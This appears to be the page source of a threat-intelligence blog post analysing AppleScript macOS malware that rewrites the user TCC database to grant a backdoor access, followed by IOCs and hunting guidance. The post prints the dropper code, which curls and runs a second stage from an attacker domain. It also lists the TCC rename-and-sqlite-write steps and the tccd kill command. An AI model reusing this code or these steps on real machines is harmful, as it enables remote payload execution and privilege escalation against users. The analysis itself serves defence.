<script>
    import { CodeBlock } from "@skeletonlabs/skeleton";
    import { getModalStore } from "@skeletonlabs/skeleton";
    import tcc_prompt from "./tcc_prompt.png";
    import script_editor from "./script_editor.png";
    import TagList from "$lib/tagList.svelte";
    
    let modalStore = getModalStore();
    
    function navigate(url) {
        window.location.href = url;
    }
    
    function triggerImageModal(image) {
        const modal = {
            image: image,
            modalClasses:
            "max-w-[90%] max-h-[90%] rounded-container-token overflow-hidden shadow-xl",
        };
        modalStore.trigger(modal);
    }
    
    let tags = [
    "threat intelligence",
    "malware analysis",
    "macOS",
    "privilege escalation",
    "TCC",
    "AppleScript",
    ];
</script>

<div
class="container h-full mx-auto flex justify-center items-center leading-relaxed"
>
<div class="space-y-5 m-10 custom-container">
    <h1 class="h1 text-center mb-12" on:click={() => navigate("/")}>
        @oj-sec
    </h1>
    <h2 class="h2">
        TChCh-Changes: A Look at macOS TCC Manipulation in the Wild
    </h2>
    <p>21 July 2026 - 18 min read</p>
    <TagList {tags} />
    
    <h3 class="h3">Key Points</h3>
    <ul class="list-disc ml-4">
        <li>
            Since at least early 2025, a threat actor has distributed AppleScript-based macOS malware that interferes with the system Transparency, Control and Consent (TCC) database to escalate privileges for an AppleScript backdoor.
        </li>
        <li>
            The threat actor's privilege escalation technique fails on macOS Tahoe and Sequoia versions released after at least April 2026 due to security patches by Apple.
        </li>
        <li>
            The threat actor appears to have targeted employee endpoints in cryptocurrency organisations. Techniques and targeting overlap with North Korean nation-state threat actor Sapphire Sleet, but have distinct implementation and infrastructure. We assess that this activity relates to an independent activity cluster or subgroup. 
        </li>
        <li>
            This report analyses the most recent version of the malware, distributed in July 2026, and provides guidance for detecting direct TCC manipulation.
        </li>
    </ul>
    
    <h3 class="h3">Background</h3>
    <p>
        Transparency, Control and Consent (TCC) is a macOS security feature that
        gates sensitive system actions behind user consent prompts. TCC permission
        grants are tracked in databases located at
        <span class="pre p-1"
        >/Library/Application Support/com.apple.TCC/TCC.db</span
        >
        (for system-level permissions) and
        <span class="pre p-1"
        >~/Library/Application Support/com.apple.TCC/TCC.db</span
        >
        (for user-level permissions). These databases store responses to user
        prompts created by the operating system when processes try to take
        protected actions, like reading certain files, issuing automation commands
        to other processes and capturing the screen.
    </p>
    <div class="flex justify-center mt-4 mb-4">
        <div
        class="flex justify-center mt-0 cursor-pointer"
        on:click={() => triggerImageModal(tcc_prompt)}
        >
        <img src={tcc_prompt} alt="TCC Prompt" class="max-w-2xl" />
    </div>
</div>
<p>
    The system-level TCC database is protected by System Integrity Protection
    (SIP), meaning it cannot be modified by userspace processes. The
    user-level TCC database is not protected by SIP, but has an independent
    set of filesystem restrictions in recent macOS versions. The composition
    of TCC records, responsibilities between system and user-level components
    and the filesystem protections are not publicly documented by Apple.
</p>
<p>
    The TCC database has been a consistent target for macOS malware and
    various injection techniques have been patched over the years (see, e.g.
    excellent work by
    <a
    href="https://web.archive.org/web/20240411112413/https://interpressecurity.com/resources/return-of-the-macos-tcc/"
    style="text-decoration: underline; color: lightblue;">Marina Liang</a
    >
    and
    <a
    href="https://web.archive.org/web/20240407003208/https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/"
    style="text-decoration: underline; color: lightblue;">Phil Stokes</a
    >). North Korean nation-state threat actors have a particular affinity for
    TCC manipulation and have been integrating variations into malware
    payloads since
    <a
    href="https://www.welivesecurity.com/2022/07/19/i-see-what-you-did-there-look-cloudmensis-macos-spyware/"
    style="text-decoration: underline; color: lightblue;">at least 2022</a
    >. Wiz suggests that there are
    <a
    href="https://www.wiz.io/blog/threat-actors-target-crypto-orgs"
    style="text-decoration: underline; color: lightblue;"
    >at least two independent clusters of North Korean TCC-exploiting
    malware currently active</a
    >, with one implementation using a transparent UI overlay element to
    disguise the TCC dialog the user is interacting with. The other
    implementation uses Finder AppleEvent <span class="pre p-1">tell</span>
    commands to rename the userspace TCC directory, write new permissions
    directly, then restore the TCC directory and restart the
    <span class="pre p-1">tccd</span>
    daemon to trigger a database reload with new permissions.
</p>
<p>
    The latter cluster of direct writes to the TCC database includes several
    overlapping threat actors deploying similar malware against similar
    targets:
</p>
<ul class="list-disc ml-4">
    <li>
        <a
        href="https://securelist.com/bluenoroff-apt-campaigns-ghostcall-and-ghosthire/117842/"
        style="text-decoration: underline; color: lightblue;"
        >Kaspersky attributed the technique to BlueNoroff in October 2025</a
        >
    </li>
    <li>
        <a
        href="https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering"
        style="text-decoration: underline; color: lightblue;"
        >Mandiant attributed the technique to UNC1069 in February 2026</a
        >
    </li>
    <li>
        <a
        href="https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/"
        style="text-decoration: underline; color: lightblue;"
        >Microsoft publicly attributed the technique to Sapphire Sleet in
        April 2026</a
        >
        and
        <a
        href="https://www.levelblue.com/blogs/spiderlabs-blog/sapphire-sleet-targets-macos-in-multi-stage-intrusion-campaign"
        style="text-decoration: underline; color: lightblue;"
        >LevelBlue reported a follow-up observation in May 2026</a
        >
    </li>
</ul>
<p>
    In the latter two instances, the threat actor wrote permissions into the
    TCC database for native system utilities including
    <span class="pre p-1">osascript</span>
    and <span class="pre p-1">Terminal</span>, allowing subsequent stages
    to call native tools and inherit their higher privileges. The threat actor
    added permissions for
    <span class="pre p-1">kTCCServiceSystemPolicyDocumentsFolder</span>,
    <span class="pre p-1">kTCCServiceSystemPolicyDownloadsFolder</span>,
    <span class="pre p-1">kTCCServiceSystemPolicyDesktopFolder</span>
    and <span class="pre p-1">AppleEvents</span> permissions targeting Finder.
</p>
<p>
    This report focuses on an alternative, more sparsely reported cluster that
    also uses direct TCC writes facilitated through Finder tell commands,
    targeting overlapping permissions. Instead of targeting system binaries,
    this cluster establishes permissions for a malicious Applet backdoor
    delivered to and compiled on the device.
    <a
    href="https://slowmist.medium.com/threat-intelligence-analysis-of-token-vesting-phishing-poisoning-50f39f5b9718"
    style="text-decoration: underline; color: lightblue;">SlowMist</a
    >
    and
    <a
    href="https://www.darktrace.com/blog/applescript-abuse-unpacking-a-macos-phishing-campaign"
    style="text-decoration: underline; color: lightblue;">Darktrace</a
    >
    have reported on this cluster, both in February 2026. Researchers have
    also suggested the campaign is North Korean in
    <a
    href="https://x.com/_av4x/status/2052170440744054843"
    style="text-decoration: underline; color: lightblue;"
    >informal reporting on X</a
    >.
</p>
<p>
    Formal attribution is better left to others with more visibility into this
    threat actor. However, it should be uncontroversial to note that a
    near-identical implementation of a low-prevalence technique against
    similar targets over the same time period is suggestive of a common
    technical or operational lineage between this cluster and Sapphire Sleet.
    Both clusters also share a low-prevalence delivery method - an AppleScript
    payload that attempts to social engineer user execution.
</p>

<h3 class="h3">Part 1 - Malware Analysis</h3>

<h4 class="h4">Delivery &amp; Execution</h4>
<p>
    The initial payload is a run-only AppleScript file named
    <span class="pre p-1"
    >YZi Labs - Audit Confirmation Form - June 30 2026.docx.scpt</span
    >
    with sha256 hash
    <span class="pre p-1 break-all"
    >53b2d24c9aefe01a768f6e2c637ab9fd56dcede852925cec18eccae58dfecec7</span
    >. Despite being dated 30 June 2026, the file was likely distributed on
    or after 13 July 2026 based on metadata in subsequent stages. AppleScript
    files natively open in the macOS Script Editor application when opened
    from Finder. The script opens to display text masquerading as a
    "Compatibility Wizard" and instructing the user to run the script.
</p>
<div class="flex justify-center mt-4 mb-4">
    <div
    class="flex justify-center mt-0 cursor-pointer"
    on:click={() => triggerImageModal(script_editor)}
    >
    <img src={script_editor} alt="Script Editor" class="max-w-2xl" />
</div>
</div>
<p>
    Spaced out of view with more than 1000 newlines is the following block of
    code that drops the second stage:
</p>
<CodeBlock
language="applescript"
code={`--  Check if any extensions missing
try
	set cpu_type to do shell script "uname -m"
	set verString to do shell script "sw_vers -productVersion"
	set ptSelf to POSIX path of (path to me)
	set savePath to do shell script "dirname " & quoted form of ptSelf
	set saveFile to savePath & "/" & ".071305_YZi.scpt"
	set ur to "https://cigalsn.com/wp-includes/php-compat/common/resources/interface.php?req=trouble&tpl=071305_YZi&ver=" & verString & "&type=" & cpu_type
	do shell script "curl -sLk -o " & quoted form of saveFile & " " & quoted form of ur
	set scObj to load script saveFile
	do shell script "rm -f " & quoted form of saveFile
	tell scObj to run
on error
	-- display dialog "Unknown exception occurred during Compatibility Wizard." with icon stop
	delay 1.5
	quit me
end try`}
    ></CodeBlock>
    <p>
        For an up-to-date system on Apple Silicon, the next stage URL will be
        <span class="pre p-1 break-all"
        >hxxps[:]//cigalsn[.]com/wp-includes/php-compat/common/resources/interface.php?req=trouble&tpl=071305_YZi&ver=26.5.2&type=arm64</span
        >. At the time of analysis, this URL served a file with the sha256 hash
        <span class="pre p-1 break-all"
        >59912303968e90a7a94babf8822cc6d3f8624891ee21cce737a656f7383e4d79</span
        >
        which is saved to the current working directory as
        <span class="pre p-1">.071305_YZi.scpt</span>
        temporarily before being read into the memory of the first stage and
        deleted from disk. The second stage payload is run-only AppleScript that
        cannot be returned to the original source code.
    </p>
    
    <h4 class="h4">Second Stage - Privilege Escalation</h4>
    <p>
        The second stage serves to further the social engineering, prepare the
        target system and deliver and compile the backdoor. The malware drops a
        configuration file containing the C2 endpoint to
        <span class="pre p-1"
        >~/Library/Application Support/Applets/.svc.conf</span
        >
        and shows a decoy dialog to the user. The decoy dialog displays the
        following messages with a styled progress bar that fills over five
        seconds:
    </p>
    <CodeBlock
    language="plaintext"
    code={`"Diagnosing system update issues ..."
"Fixing document viewer applications compatibilities ..."
"Checking if necessary software extensions are installed ... "
"Fixed all issues found and opening your document ..."`}
    ></CodeBlock>
    <p>
        In the background, the malware downloads and opens a decoy document and
        the third stage backdoor. The decoy document is a Microsoft Word document
        containing lure content bespoke to the target organisation and the audit
        theme. The backdoor stage is further run-only AppleScript saved as <span class="pre p-1">ptApp</span>.
        The malware attempts to establish escalated privileges for the backdoor by taking the
        following steps:
    </p>
    <ul class="list-disc ml-4">
        <li>
            Compiles the AppleScript into an application bundle named
            <span class="pre p-1">ptApp.app</span>
            with
            <span class="pre p-1"
            >osacompile -s -x -l AppleScript -o ptApp</span
            >
        </li>
        <li>
            Sets <span class="pre p-1">LSUIElement</span> to
            <span class="pre p-1">true</span> in the application's
            <span class="pre p-1">info.plist</span>, designating it as a background
            application that will not show an icon in the dock when executed
        </li>
        <li>
            Creates an ad hoc code signature for the application bundle with
            <span class="pre p-1">codesign --force --deep --sign ptApp.app</span>
        </li>
        <li>
            Uses Finder <span class="pre p-1">tell</span> AppleEvents commands to
            rename the userspace TCC directory with a random suffix
        </li>
        <li>
            Copies the <span class="pre p-1">TCC.db</span> file out of the renamed
            directory and restores the userspace TCC directory name
        </li>
        <li>
            Writes permissions for the backdoor bundle directly into the copied
            <span class="pre p-1">TCC.db</span> file using
            <span class="pre p-1">sqlite</span> commands
        </li>
        <li>
            Uses Finder <span class="pre p-1">tell</span> AppleEvents commands to
            rename the userspace TCC directory again
        </li>
        <li>
            Copies the modified <span class="pre p-1">TCC.db</span> back into the
            renamed directory and restores the correct directory name again
        </li>
        <li>
            Kills the <span class="pre p-1">tccd</span> process with <span class="pre p-1 break-all">{"ps -xo pid,user,comm | grep tccd | awk -v u=$(whoami) '$2==u {print $1}' | xargs kill -9"}</span> to trigger a database reload
        </li>
    </ul>
    <p>
        The malware consistently uses <span class="pre p-1"
        >tell application Finder</span
        >
        <span class="pre p-1">AppleEvents</span> commands throughout its filesystem
        manipulation and would likely prompt the user with a
        <span class="pre p-1"
        >'Script Editor wants access to control "Finder"'</span
        >
        prompt unless the user has previously authorized Script Editor.
    </p>
    <p>
        Consistent with Sapphire Sleet's TCC manipulation, the malware writes the
        following permissions for the backdoor:
    </p>
    <ul class="list-disc ml-4">
        <li>
            <span class="pre p-1"
            >kTCCServiceSystemPolicyDocumentsFolder</span
            >, allowing access to the <span class="pre p-1">~/Documents</span> folder
            for the compromised user
        </li>
        <li>
            <span class="pre p-1"
            >kTCCServiceSystemPolicyDownloadsFolder</span
            >, allowing access to the <span class="pre p-1">~/Downloads</span> folder
            for the compromised user
        </li>
        <li>
            <span class="pre p-1"
            >kTCCServiceSystemPolicyDesktopFolder</span
            >, allowing access to the <span class="pre p-1">~/Desktop</span> folder
            for the compromised user
        </li>
        <li>
            <span class="pre p-1">AppleEvents</span> targeting
            <span class="pre p-1">com.apple.finder</span>
        </li>
    </ul>
    <p>
        Unlike samples from other reporting, this cluster also attempts to write
        the <span class="pre p-1">kTCCServiceSystemPolicyAppData</span>
        permission, which protects paths under
        <span class="pre p-1">~/Library/Containers/</span> containing
        <a
        href="https://jhftss.github.io/CVE-2023-42929-Why-Do-We-Need-The-App-Container-Protection/"
        style="text-decoration: underline; color: lightblue;"
        >sandboxed application data</a
        >. Sensitive information protected by this permission includes the native
        Mail client and Notes app databases.
    </p>
    <p>
        This privilege escalation technique does not work on Tahoe systems from at
        least 26.4.1 onwards or Sequoia from at least 15.7.7 onwards, released in
        April and May 2026. The technique may have been patched out even earlier
        than this period, but these are the earliest builds we had access to for
        testing. More information on the failure mode is available in Part 2.
    </p>
    <p>
        The fact that the threat actor collects targets' macOS version in the
        dropper stage then serves a payload that does not work on that system
        appears to be a notable mistake, particularly given lures appear to be
        hand crafted and are likely delivered at a low rate. The threat actor may
        have engaged with targets via some other method and have alternative
        fingerprinting information before delivering the initial payload.
    </p>
    
    <h4 class="h4">Third Stage - Persistent Backdoor</h4>
    <p>
        The third stage backdoor is dropped to disk with sha256 hash
        <span class="pre p-1 break-all"
        >f56c7d566204ce890b7c0f70878a38b375e35fe3f12aa96a69ede1dad6e59b4f</span
        >
        then base64 decoded into AppleScript with sha256
        <span class="pre p-1 break-all"
        >6abb8eacc77dc7acf4e0047dd493f3a1e73abeb4ebc3b63ccb9e7c1db6773d03</span
        >. The backdoor is a lightweight beacon that executes further AppleScript
        payloads served by the threat actor. We did not observe any follow on
        payload delivery during analysis and assess that the backdoor is intended
        to facilitate hands on keyboard access.
    </p>
    <p>
        The backdoor uses the C2 config dropped to
        <span class="pre p-1"
        >~/Library/Application Support/Applets/.svc.conf</span
        >
        but also contains a hardcoded fallback C2 of
        <span class="pre p-1 break-all"
        >hxxps[:]//ecoferros[.]com/wp-content/plugins/elementor/includes/controls/captcha/controller</span
        >, which is linked to earlier iterations of this campaign.
    </p>
    <p>
        The backdoor makes itself persistent with a LaunchAgent and collects basic
        system information including a process listing and hardware identifiers.
        The backdoor lists files in
        <span class="pre p-1">/Users</span>,
        <span class="pre p-1">/Applications</span>,
        <span class="pre p-1">~/Downloads</span>,
        <span class="pre p-1">~/Documents</span> and
        <span class="pre p-1">~/Desktop</span>, capturing filenames, sizes, modification
        dates and ownership. The backdoor packages the collected data into a JSON
        object and sends it to the path
        <span class="pre p-1"
        >/.php?req=contact&dv=&lt;device_serial_number&gt;</span
        >
        on the current C2 endpoint.
    </p>
    <p>
        The backdoor then polls the C2 endpoint
        <span class="pre p-1"
        >/.php?req=tell&dv=&lt;device_serial_number&gt;</span
        >
        for further AppleScript payloads, which are dropped to disk and executed
        with <span class="pre p-1">load script</span> and
        <span class="pre p-1">run</span> built in AppleScript functions.
    </p>
    
    <h4 class="h4">Indicators of Compromise</h4>
    <CodeBlock
    language="plaintext"
    code={`# fqdn
cigalsn.com
ecoferros.com

# sha256
53b2d24c9aefe01a768f6e2c637ab9fd56dcede852925cec18eccae58dfecec7
59912303968e90a7a94babf8822cc6d3f8624891ee21cce737a656f7383e4d79
f56c7d566204ce890b7c0f70878a38b375e35fe3f12aa96a69ede1dad6e59b4f
6abb8eacc77dc7acf4e0047dd493f3a1e73abeb4ebc3b63ccb9e7c1db6773d03`}
        ></CodeBlock>
        <p><i>Historical domains:</i></p>
        <CodeBlock
        language="plaintext"
        code={`# fqdn
woodcastpro.com
techcross-es.com
stomcs.com
sevrrhst.com`}
            ></CodeBlock>
            
            <h3 class="h3">Part 2 - TCC Manipulation Testing and Detection Recommendations</h3>
            
            <h4 class="h4">Failure Condition</h4>
            <p>
                As noted above, the TCC manipulation technique implemented by this malware
                family does not work on macOS Tahoe or Sequoia versions released after
                April 2026 (and potentially earlier) under ordinary conditions. The
                failure occurs when attempting to rename the
                <span class="pre p-1"
                >~/Library/Application Support/com.apple.TCC</span
                >
                directory, with the Finder application itself reporting an error code.
                Without creating a clean copy of the <span class="pre p-1">TCC.db</span>
                to insert new permissions into, the technique fails. We were unable to
                trace this change to a specific CVE or patch note.
            </p>
            <p>
                An exception to this failure exists on Sequoia 15.7.7, where the operation
                will succeed if the responsible process (Script Editor, in the context of
                this infection chain) already has Full Disk Access prior to the script
                executing. On Tahoe, the operation fails irrespective of Script Editor's
                permissions. In either case, using Finder's historic hidden Full Disk
                Access privilege is unnecessary if the parent process already has Full
                Disk Access.
            </p>
            <p>
                In circumstances where the <span class="pre p-1">TCC.db</span> is
                overwritten with a copy that has been manipulated, killing the
                <span class="pre p-1">tccd</span> userspace process will cause the new
                permissions to load and take effect. This pathway can still be achieved if
                malware has Full Disk Access or can otherwise write to protected areas.
                Unfortunately Full Disk Access is not always out of reach for threat
                actors, as it's commonly granted to IDE and terminal applications on
                developer endpoints. Developer endpoints are also the most likely machines
                to be infected by malicious installer commands and compromised supply
                chain components. There have also been a wealth of vulnerabilities over
                the years that have allowed writing to protected files on macOS (see,
                e.g.
                <a
                href="https://mysk.blog/2026/05/19/cve-2026-28910/"
                style="text-decoration: underline; color: lightblue;">CVE-2026-28910</a
                >). For these reasons, direct TCC manipulation is still a technique worth
                spending some time on if you're in a macOS environment and have
                sophisticated threat actors in your threat model.
            </p>
            <p>
                The forthcoming macOS 27 (Golden Gate) release
                <a
                href="https://x.com/theevilbit/status/2066443202479976461"
                style="text-decoration: underline; color: lightblue;"
                >appears set to further frustrate direct TCC manipulation</a
                >
                by moving the user TCC to a new path at
                <span class="pre p-1 break-all"
                >/private/var/containers/Data/ProtectedSystem/[UUID]/Data/Library/Application Support/com.apple.TCC/</span
                >, which will require an additional entitlement above Full Disk Access to
                modify. macOS 27 is scheduled for general availability in September 2026.
            </p>
            
            <h4 class="h4">Hunting/Detection Guidance</h4>
            <p>
                TCC modification events are exposed under the Endpoint Security Framework
                (ES) and offer an excellent opportunity to identify synthetically inserted
                TCC entries. Synthetically inserted TCC entries do not trigger the
                <span class="pre p-1">tcc_modify</span> endpoint security event.
            </p>
            <p>
                Organisations collecting and logging <span class="pre p-1">tcc_modify</span>
                events generated by their EDR can use this discrepancy to hunt for
                synthetically generated TCC permissions. A threat hunt based on this idea
                would consist of the following two stages:
            </p>
            <ul class="list-disc ml-4">
                <li>
                    Collect raw data from the <span class="pre p-1">TCC.db</span> files that
                    exist on disk. Tools like OSQuery or Velociraptor allow this collection
                    without needing to ship the entire files, but this could be accomplished
                    with any remote response tool.
                </li>
                <li>
                    For each TCC entry collected from endpoints, attempt to match the entry
                    with a <span class="pre p-1">tcc_modify</span> entry in EDR logs.
                    Entries from the raw data that cannot be correlated to a matching EDR
                    event did not enter the TCC via a user prompt and should be investigated.
                </li>
            </ul>
            <p>
                The raw data may need some pruning around events that were inserted
                outside of the time range of EDR logging or built in permissions, but TCC
                events are timestamped, which should make this an approachable task.
            </p>
            <p>
                It's also worth noting that command lines containing
                <span class="pre p-1">tccd</span> (with word boundaries either side) anywhere in
                them are likely to be pretty rare in most environments and might be worth
                hunting over. Termination of the <span class="pre p-1">tccd</span>
                process by a user should be regarded as suspicious in almost all circumstances.
            </p>
            <p>
                Finally, while it's likely that no one really needs a reminder, this
                activity is another example of the merit of timely patching on endpoints.
                The threat actor's continued use of a technique that has been nonviable for
                at least three months suggests that they are still coming across out of
                date systems and finding success.
            </p>
        </div>
    </div>
    
    <style>
        @media (max-width: 639px) {
            .custom-container {
                max-width: calc(100% - 2rem);
                padding-left: 1rem;
                padding-right: 1rem;
            }
        }
        @media (min-width: 640px) and (max-width: 767px) {
            .custom-container {
                max-width: calc(100% - 4rem);
                padding-left: 2rem;
                padding-right: 2rem;
            }
        }
        @media (min-width: 768px) and (max-width: 1023px) {
            .custom-container {
                max-width: calc(100% - 6rem);
                padding-left: 3rem;
                padding-right: 3rem;
            }
        }
        @media (min-width: 1024px) {
            .custom-container {
                max-width: calc(100% - 8rem);
                padding-left: 4rem;
                padding-right: 4rem;
            }
        }
    </style> 
    